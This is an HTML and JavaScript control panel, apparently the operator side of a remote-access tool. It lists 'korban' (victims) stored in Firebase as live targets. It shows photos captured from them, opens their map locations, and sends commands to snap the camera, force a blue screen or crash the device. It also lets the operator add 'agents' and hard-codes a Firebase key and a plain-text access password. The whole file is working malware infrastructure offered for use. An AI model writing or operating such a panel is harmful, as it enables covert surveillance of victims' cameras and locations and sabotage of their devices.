<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>VOID-OS | EAGLE COMMANDER</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        :root { --neon: #ff00ea; --cyber: #00f2ff; --bg: #050505; --card: #121212; --danger: #ff4444; --success: #00ff88; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; flex-direction: column; }
        
        /* LOGO SVG (Anti-Hilang) */
        .eagle-svg { width: 80px; fill: var(--neon); filter: drop-shadow(0 0 10px var(--neon)); margin-bottom: 10px; }

        /* NAVIGATION TABS */
        .tab-bar { background: #111; display: flex; justify-content: space-around; border-bottom: 1px solid #333; padding: 12px 0; }
        .tab-btn { background: none; border: none; color: #555; font-size: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        .tab-btn.active { color: var(--cyber); text-shadow: 0 0 5px var(--cyber); }

        /* HEADER */
        .header { padding: 15px; text-align: center; border-bottom: 1px solid var(--neon); background: #0a0a0a; }

        /* CONTENT */
        .content { flex: 1; overflow-y: auto; padding: 15px; display: none; }
        .content.active { display: block; }

        /* CARDS */
        .card { background: var(--card); border: 1px solid #222; border-radius: 12px; padding: 15px; margin-bottom: 15px; }
        .target-item, .agent-item { padding: 12px; border: 1px solid #222; margin-bottom: 10px; border-radius: 8px; background: #181818; display: flex; justify-content: space-between; align-items: center; }
        .target-item.active { border-color: var(--cyber); }

        /* INPUTS & BUTTONS */
        input { background: #000; border: 1px solid #333; color: #fff; padding: 10px; width: 100%; border-radius: 5px; margin-bottom: 10px; box-sizing: border-box; outline: none; }
        input:focus { border-color: var(--neon); }
        .btn { padding: 10px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 10px; text-transform: uppercase; width: 100%; margin-top: 5px; }
        .btn-main { background: var(--cyber); color: #000; }
        .btn-danger { background: var(--danger); color: #fff; }
        .btn-control { background: #222; color: #fff; border: 1px solid #444; }

        /* LOGIN */
        #login-screen { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; text-align: center; }

        #preview-img { width: 100%; border-radius: 8px; border: 1px solid var(--cyber); margin-top: 10px; display: none; }
    </style>
</head>
<body onload="checkAuth()">

    <div id="login-screen">
        <div class="card" style="width: 280px;">
            <svg class="eagle-svg" viewBox="0 0 24 24"><path d="M12 2L4.5 20.29l.71.71L12 18l6.79 3 .71-.71L12 2zM12 15.5l-3.5 1.5 3.5-8.5 3.5 8.5-3.5-1.5z"/></svg>
            <h3 style="color:var(--neon);">EAGLE ACCESS</h3>
            <input type="password" id="passkey" placeholder="ACCESS KEY">
            <button class="btn btn-main" onclick="login()">IGNITE</button>
        </div>
    </div>

    <div class="header">
        <svg class="eagle-svg" style="width:40px;" viewBox="0 0 24 24"><path d="M12 2L4.5 20.29l.71.71L12 18l6.79 3 .71-.71L12 2zM12 15.5l-3.5 1.5 3.5-8.5 3.5 8.5-3.5-1.5z"/></svg>
        <div style="font-size:10px; letter-spacing:2px; color:var(--neon);">VOID-OS ULTRA v15.0</div>
    </div>

    <div class="tab-bar">
        <button class="tab-btn active" onclick="showTab('radar')">RADAR</button>
        <button class="tab-btn" onclick="showTab('control')">CONTROL</button>
        <button class="tab-btn" onclick="showTab('agents')">AGENTS</button>
    </div>

    <div id="radar" class="content active">
        <div class="card">
            <h4 style="margin:0 0 10px;">ACTIVE TARGETS</h4>
            <div id="target-list">Searching...</div>
        </div>
    </div>

    <div id="control" class="content">
        <div class="card">
            <h3 id="target-id" style="color:var(--neon); margin:0;">NO TARGET</h3>
            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:15px;">
                <button class="btn btn-control" onclick="send('TAKE')">📸 SNAP</button>
                <button class="btn btn-control" onclick="track()">🌍 TRACK</button>
                <button class="btn btn-control" style="color:#0078d7;" onclick="send('BSOD')">🌀 BSOD</button>
                <button class="btn btn-control" style="color:var(--danger);" onclick="send('CRASH')">💀 CRASH</button>
            </div>
            <img id="preview-img" src="">
        </div>
    </div>

    <div id="agents" class="content">
        <div class="card">
            <h4>CREATE NEW AGENT</h4>
            <input type="text" id="new-name" placeholder="Agent Name">
            <input type="text" id="new-pass" placeholder="Set Access Key">
            <button class="btn btn-main" onclick="createAgent()">ADD AGENT</button>
        </div>
        <div class="card">
            <h4>MANAGE AGENTS</h4>
            <div id="agent-list">Loading agents...</div>
        </div>
    </div>

<script>
    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
    firebase.initializeApp(config); const db = firebase.database();
    let activeNode = null; let activeMaps = "";

    function showTab(t) {
        document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.getElementById(t).classList.add('active');
        event.currentTarget.classList.add('active');
    }

    function login() { if(document.getElementById('passkey').value === "Secret") { sessionStorage.setItem('auth', 'true'); location.reload(); } else { alert("WRONG KEY"); } }
    function checkAuth() { if(sessionStorage.getItem('auth')) { document.getElementById('login-screen').style.display = 'none'; startRadar(); loadAgents(); } }

    // --- RADAR LOGIC ---
    function startRadar() {
        db.ref('korban').on('value', snap => {
            let h = "";
            snap.forEach(c => { h += `<div class="target-item" id="n-${c.key}" onclick="select('${c.key}','${c.val().maps}')"><span>📍 NODE_${c.key.substring(1,7)}</span><span style="color:var(--success); font-size:9px;">LIVE</span></div>`; });
            document.getElementById('target-list').innerHTML = h || "No Signals.";
        });
    }

    function select(id, maps) {
        activeNode = id; activeMaps = maps;
        document.getElementById('target-id').innerText = `NODE: ${id.substring(1,8)}`;
        db.ref('hasil_foto/'+id).on('value', f => { if(f.val()){ document.getElementById('preview-img').src = f.val().foto; document.getElementById('preview-img').style.display = 'block'; } });
        showTab('control');
    }

    // --- AGENT MANAGEMENT ---
    function createAgent() {
        const name = document.getElementById('new-name').value;
        const pass = document.getElementById('new-pass').value;
        if(name && pass) {
            db.ref('users/' + pass).set({ n: name, r: "AGENT" });
            alert("Agent Created!");
            document.getElementById('new-name').value = ""; document.getElementById('new-pass').value = "";
        }
    }

    function loadAgents() {
        db.ref('users').on('value', snap => {
            let h = "";
            snap.forEach(u => {
                h += `<div class="agent-item">
                        <span>👤 ${u.val().n} (${u.key})</span>
                        <button class="btn btn-danger" style="width:60px; margin:0;" onclick="removeAgent('${u.key}')">DEL</button>
                      </div>`;
            });
            document.getElementById('agent-list').innerHTML = h || "No agents found.";
        });
    }

    function removeAgent(key) { if(confirm("Delete this agent?")) db.ref('users/'+key).remove(); }

    function send(c) { if(activeNode) db.ref('commands/'+activeNode).set({action:c, t:Date.now()}); }
    function track() { if(activeMaps) window.open(activeMaps); }
</script>
</body>
</html>
